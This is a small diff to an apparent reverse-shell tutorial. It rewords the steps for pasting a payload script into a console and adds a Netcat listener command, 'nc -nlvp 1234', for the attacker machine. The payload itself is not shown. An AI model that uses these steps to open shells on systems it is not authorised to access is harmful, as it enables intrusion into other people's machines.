@@ -19,10 +19,10 @@ example of reverse shell:
 payload.sh
 
 
-Step 5: Paste this script in the console.
-Paste the script above and click "Run" button
+Step 5: Paste this script in the console and click "Run" button
 
 Step 6: Start Netcat listener on the Attacker machine.
+command: nc -nlvp 1234
 
-And after some few second you will get the reverse shell or backdoor back
+And after some few second you will get the reverse shell
 ```
